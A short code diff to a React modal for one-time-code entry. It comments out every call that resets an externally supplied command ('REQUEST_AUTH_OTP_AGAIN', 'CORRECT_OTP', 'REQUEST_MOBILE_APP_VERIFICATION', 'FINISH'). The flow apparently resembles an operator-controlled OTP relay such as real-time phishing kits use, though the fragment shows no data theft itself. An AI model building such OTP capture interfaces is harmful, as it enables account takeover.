@@ -16,7 +16,7 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
     const [animate, setAnimate] = useState('opacity-0')
     const [otpCode, setOtpCode] = useState('');
     const [invalid, setInvalid] = useState(false);
-    let { command, resetCommand  } = useCommand(); // Get current command
+    let { command } = useCommand(); // Get current command
     const [isVerified, setIsVerified] = useState(false);
     const [bgLoader, setBgLoader] = useState(false);
 
@@ -34,22 +34,22 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
         if (command === 'REQUEST_AUTH_OTP_AGAIN') {
             setIsLoading(false);
             setInvalid(true);
-            resetCommand();
+            // resetCommand();
         } else if (command === 'REQUEST_PHONE_OTP_AGAIN') {
             setIsLoading(false);
             setInvalid(true);
-            resetCommand();
+            // resetCommand();
         } else if (command === 'CORRECT_OTP') {
             console.log("Correct OTP received for:", modal);
             setIsLoading(false);
             setIsVerified(true); // Mark as verified
-            resetCommand();
+            // resetCommand();
         }  else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
             setIsLoading(false);
             setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
-                resetCommand(); 
+                // resetCommand(); 
                 router.push('/MfaPage');
             }, 1500);
         } else if (command === 'FINISH') {
